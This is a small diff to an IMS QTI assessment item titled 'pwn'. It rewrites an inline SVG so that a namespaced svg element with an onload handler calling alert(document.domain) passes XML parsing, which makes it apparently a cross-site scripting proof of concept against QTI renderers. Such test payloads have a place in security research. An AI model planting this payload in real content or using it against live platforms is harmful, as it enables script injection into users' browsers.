@@ -1,5 +1,6 @@
-<assessmentItem title="pwn" identifier="x" xmlns="http://www.imsglobal.org/xsd/imsqti_v2p1">
-  <itemBody>
-    <div><svg/onload=alert(document.domain)></div>
+<?xml version="1.0" encoding="UTF-8"?>
+<assessmentItem xmlns="http://www.imsglobal.org/xsd/imsqti_v2p1" identifier="x" title="pwn">
+  <itemBody xmlns="http://www.w3.org/1999/xhtml" xmlns:svg="http://www.w3.org/2000/svg">
+    <svg:svg onload="alert(document.domain)"></svg:svg>
   </itemBody>
 </assessmentItem>
